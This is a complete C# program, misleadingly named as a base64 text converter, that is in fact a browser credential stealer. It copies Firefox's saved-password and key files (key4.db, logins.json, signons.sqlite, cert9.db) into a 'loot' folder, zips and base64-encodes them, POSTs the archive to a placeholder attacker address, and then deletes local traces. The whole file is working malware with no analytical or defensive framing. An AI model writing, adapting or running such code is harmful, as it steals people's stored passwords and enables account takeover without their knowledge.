using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.IO.Compression;
using System.Net;
using System.Collections.Specialized;

namespace GetBase64StringFromText
{
    class Program
    {
        static void Main(string[] args)
        {

            string profile = Environment.CurrentDirectory = Environment.GetEnvironmentVariable("USERPROFILE");
            string lootPath = (profile + "\\Downloads\\loot\\");
            DirectoryInfo di = Directory.CreateDirectory(lootPath);
            string keyPath = (profile + "\\Downloads\\loot\\key4.db");
            string signonsPath = (profile + "\\Downloads\\loot\\signons.sqlite");
            string certPath = (profile + "\\Downloads\\loot\\cert9.db");
            string loginsPath = (profile + "\\Downloads\\loot\\logins.json");
            string zipPath = (profile + "\\Downloads\\loot.zip");

            string apppath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string mozilla = System.IO.Path.Combine(apppath, "Mozilla\\Firefox\\Profiles");
            //Console.WriteLine(mozilla);

            foreach (string f in Directory.EnumerateFiles(mozilla, "key4.db", SearchOption.AllDirectories))
            {
                if (File.Exists(f))
                {
                    File.Copy(f, keyPath,true);

                }
                else
                {
                    continue;
                }
            }

            foreach (string f in Directory.EnumerateFiles(mozilla, "signons.sqlite", SearchOption.AllDirectories))
            {
                if (File.Exists(f))
                {
                    File.Copy(f, signonsPath,true);

                }
                else
                {
                    continue;
                }
            }

            foreach (string f in Directory.EnumerateFiles(mozilla, "cert9.db", SearchOption.AllDirectories))
            {
                if (File.Exists(f))
                {
                    File.Copy(f, certPath, true);

                }
                else
                {
                    continue;
                }
            }

            foreach (string f in Directory.EnumerateFiles(mozilla, "logins.json", SearchOption.AllDirectories))
            {
                if (File.Exists(f))
                {
                    File.Copy(f, loginsPath, true);

                }
                else
                {
                    continue;
                }
            }

            ZipFile.CreateFromDirectory(lootPath, zipPath);

            string filepath = zipPath;
            byte[] bytes = File.ReadAllBytes(filepath);
            string textBase64String = Convert.ToBase64String(bytes);
            Console.WriteLine(textBase64String);
            

            //Server that will receive the request 
            using (var wb = new WebClient())
            {
                string url = "YOUR IP";
                var data = new NameValueCollection();
                data["base64"] = textBase64String;
                var response = wb.UploadValues(url, "POST", data);

            }

            File.Delete(zipPath);
            File.Delete(lootPath);
            
        }
    }
}

